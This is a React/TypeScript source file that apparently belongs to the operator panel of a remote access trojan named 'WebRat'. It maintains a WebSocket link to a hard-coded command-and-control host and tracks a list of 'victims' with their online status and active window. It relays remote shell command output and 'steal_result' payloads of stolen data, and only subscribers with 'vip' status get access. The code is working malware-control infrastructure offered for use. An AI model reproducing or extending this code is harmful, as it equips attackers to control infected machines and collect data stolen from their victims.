"use client";

import { createContext, useCallback, useContext, useEffect, useMemo, useRef, useState } from "react";
import { useQueryClient } from "@tanstack/react-query";

import type { Victim } from "../api/victims";
import { readWsHostGlobal, migrateLegacyWsHostGlobal } from "../settings/storage";
import { useSubscriptionQuery } from "../hooks/use-subscription-query";
import { dispatchWsMessage, getWsUrl, safeJsonParse, type WsConnState, type WsJson } from "./ws-client";

type WsCtx = {
    state: WsConnState;
    sendJson: (payload: Record<string, unknown>) => boolean;
};

const Ctx = createContext<WsCtx | null>(null);

export function usePanelWS(): WsCtx {
    const v = useContext(Ctx);
    if (!v) {
        return {
            state: "idle",
            sendJson: () => false,
        };
    }
    return v;
}

export function PanelWsProvider(props: { children: React.ReactNode }) {
    const { children } = props;
    const qc = useQueryClient();
    const subQ = useSubscriptionQuery();

    const DEFAULT_WS_HOST = "webcrystal.sbs";

    const [wsState, setWsState] = useState<WsConnState>("idle");

    const wsRef = useRef<WebSocket | null>(null);
    const suppressReconnectRef = useRef(false);
    const connectAfterCloseRef = useRef(false);
    const reconnectTimer = useRef<number | null>(null);
    const connectRef = useRef<() => void>(() => {
        return;
    });

    const isVip =
        String(((subQ.data as unknown as { status?: unknown } | null) ?? null)?.status || "").toLowerCase() === "vip";

    const state: WsConnState = useMemo(() => {
        return isVip ? wsState : "closed";
    }, [isVip, wsState]);

    const clearReconnect = useCallback(() => {
        if (reconnectTimer.current != null) {
            window.clearTimeout(reconnectTimer.current);
            reconnectTimer.current = null;
        }
    }, []);

    const closeWsRaw = useCallback(() => {
        clearReconnect();
        const ws = wsRef.current;
        if (ws) {
            try {
                suppressReconnectRef.current = true;
                ws.close();
            } catch {
                wsRef.current = null;
            }
        }
    }, [clearReconnect]);

    const reconnectAttempts = useRef(0);

    const scheduleReconnect = useCallback(() => {
        if (!isVip) return;
        clearReconnect();
        const attempt = reconnectAttempts.current;
        const baseDelay = Math.min(2000 * Math.pow(2, attempt), 30_000);
        const jitter = Math.random() * 1000;
        const delay = baseDelay + jitter;
        reconnectAttempts.current = attempt + 1;
        reconnectTimer.current = window.setTimeout(() => {
            try {
                connectRef.current();
            } catch {
            }
        }, delay);
    }, [clearReconnect, isVip]);

    const connect = useCallback(() => {
        if (!isVip) return;

        clearReconnect();

        const existing = wsRef.current;
        if (existing && existing.readyState !== WebSocket.CLOSED) {
            return;
        }

        try {
            migrateLegacyWsHostGlobal();
        } catch {
        }

        const host = readWsHostGlobal() || DEFAULT_WS_HOST;
        const url = getWsUrl(host);

        let ws: WebSocket;
        try {
            ws = new WebSocket(url);
        } catch {
            return;
        }

        wsRef.current = ws;
        setWsState("connecting");

        ws.onopen = () => {
            reconnectAttempts.current = 0;
            setWsState("open");
            try {
                qc.invalidateQueries({ queryKey: ["victims"] });
            } catch {
            }
        };

        ws.onerror = () => {
        };

        ws.onmessage = (event) => {
            const msg = safeJsonParse(String((event as MessageEvent).data || ""));
            if (!msg) return;

            const t = String(msg.type || "");

            const obj = msg as Record<string, unknown>;

            if (t === "victims") {
                const victimsVal = obj.victims;
                if (Array.isArray(victimsVal)) {
                    const list = (victimsVal.filter(Boolean) as unknown[]).filter((x) => typeof x === "object" && x != null) as Victim[];
                    qc.setQueryData(["victims"], list);
                }
            } else if (t === "update") {
                const id = typeof obj.id === "string" || typeof obj.id === "number" ? String(obj.id).trim() : "";
                if (!id) return;
                qc.setQueryData(["victims"], (prev: unknown) => {
                    const arr = Array.isArray(prev) ? (prev as Victim[]) : [];
                    const idx = arr.findIndex((v) => String((v as { id?: unknown }).id ?? "") === id);
                    if (idx === -1) return arr;
                    const next = [...arr];

                    const existing = next[idx];
                    const merged = { ...existing } as Record<string, unknown>;
                    if ("online" in obj) merged.online = obj.online;
                    if ("last_active" in obj) merged.last_active = obj.last_active;
                    if ("window" in obj) merged.window = obj.window;
                    next[idx] = merged as Victim;
                    return next;
                });
            } else if (t === "cmd_output") {
                try {
                    const out = obj.output;
                    const fn = (window as unknown as { WebRatAppendTerminalOutput?: unknown }).WebRatAppendTerminalOutput;
                    if (typeof fn === "function") fn(out != null ? String(out) : "");
                } catch {
                }
            } else if (t === "steal_result") {
                try {
                    const fn = (window as unknown as { WebRatOnStealResult?: unknown }).WebRatOnStealResult;
                    if (typeof fn === "function") fn(obj);
                } catch {
                }
            }

            dispatchWsMessage(msg as WsJson);
        };

        ws.onclose = () => {
            wsRef.current = null;
            setWsState("closed");

            if (connectAfterCloseRef.current) {
                connectAfterCloseRef.current = false;
                suppressReconnectRef.current = false;
                try {
                    connectRef.current();
                } catch {
                }
                return;
            }

            if (suppressReconnectRef.current) {
                suppressReconnectRef.current = false;
                return;
            }

            scheduleReconnect();
        };
    }, [clearReconnect, isVip, qc, scheduleReconnect]);

    useEffect(() => {
        connectRef.current = connect;
    }, [connect]);

    useEffect(() => {
        if (!isVip) {
            closeWsRaw();
            return;
        }

        const t = window.setTimeout(() => {
            try {
                connectRef.current();
            } catch {
            }
        }, 0);
        return () => {
            window.clearTimeout(t);
            closeWsRaw();
        };
    }, [closeWsRaw, connect, isVip]);

    useEffect(() => {
        const onHost = () => {
            if (!isVip) return;
            try {
                connectAfterCloseRef.current = true;
                closeWsRaw();
                setWsState("closed");
            } catch {
            }
        };

        try {
            window.addEventListener("webrat_ws_host_changed", onHost as EventListener);
        } catch {
            return;
        }

        return () => {
            try {
                window.removeEventListener("webrat_ws_host_changed", onHost as EventListener);
            } catch {
            }
        };
    }, [closeWsRaw, isVip]);

    useEffect(() => {
        const onUnload = () => {
            try {
                closeWsRaw();
            } catch {
            }
        };
        try {
            window.addEventListener("beforeunload", onUnload);
        } catch {
            return;
        }
        return () => {
            try {
                window.removeEventListener("beforeunload", onUnload);
            } catch {
            }
        };
    }, [closeWsRaw]);

    const sendJson = useCallback((payload: Record<string, unknown>): boolean => {
        const ws = wsRef.current;
        if (!ws || ws.readyState !== WebSocket.OPEN) return false;
        try {
            ws.send(JSON.stringify(payload));
            return true;
        } catch {
            return false;
        }
    }, []);

    const value = useMemo(() => ({ state, sendJson }), [sendJson, state]);

    return <Ctx.Provider value={value}>{children}</Ctx.Provider>;
}
